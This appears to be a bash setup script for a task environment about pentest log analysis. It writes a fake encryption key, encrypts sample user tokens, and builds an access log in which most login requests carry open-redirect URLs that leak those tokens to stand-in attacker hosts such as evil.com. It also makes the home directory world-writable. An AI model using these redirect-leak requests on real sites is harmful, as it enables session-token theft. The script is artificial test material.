#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip openssl coreutils
    pip3 install pytest

    mkdir -p /home/user/pentest_data
    echo -n "super_secret_pentest_key_999" > /home/user/pentest_data/key.txt

    # Helper to generate tokens
    encrypt_token() {
        echo -n "$1" | openssl enc -aes-256-cbc -pbkdf2 -pass file:/home/user/pentest_data/key.txt -a -e | tr -d '\n'
    }

    # 1. Valid, compromised (external redirect, future expiry)
    T1=$(encrypt_token "admin:1800000000")
    # 2. Valid, compromised (external redirect, future expiry)
    T2=$(encrypt_token "bob_the_builder:1750000000")
    # 3. Invalid: expired (external redirect, past expiry)
    T3=$(encrypt_token "alice_wonder:1600000000")
    # 4. Invalid: not compromised (internal redirect, future expiry)
    T4=$(encrypt_token "charlie_root:1800000000")
    # 5. Valid, compromised (different external, future expiry)
    T5=$(encrypt_token "zack_admin:1900000000")

    cat <<EOF > /home/user/pentest_data/access.log
192.168.1.10 - - [01/Jan/2024:10:00:00 +0000] "GET /login?redirect=http://evil.com/leak?token=$T1 HTTP/1.1" 302 -
192.168.1.11 - - [01/Jan/2024:10:05:00 +0000] "GET /login?redirect=http://attacker.net/?token=$T2 HTTP/1.1" 302 -
192.168.1.12 - - [01/Jan/2024:10:10:00 +0000] "GET /login?redirect=http://evil.com/leak?token=$T3 HTTP/1.1" 302 -
192.168.1.13 - - [01/Jan/2024:10:15:00 +0000] "GET /login?redirect=http://app.local/dashboard?token=$T4 HTTP/1.1" 302 -
192.168.1.14 - - [01/Jan/2024:10:20:00 +0000] "GET /index.html HTTP/1.1" 200 -
192.168.1.15 - - [01/Jan/2024:10:25:00 +0000] "GET /login?redirect=https://phishing-site.org/collect?token=$T5 HTTP/1.1" 302 -
EOF

    chmod 755 /home/user/pentest_data
    chmod 644 /home/user/pentest_data/access.log
    chmod 644 /home/user/pentest_data/key.txt

    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user
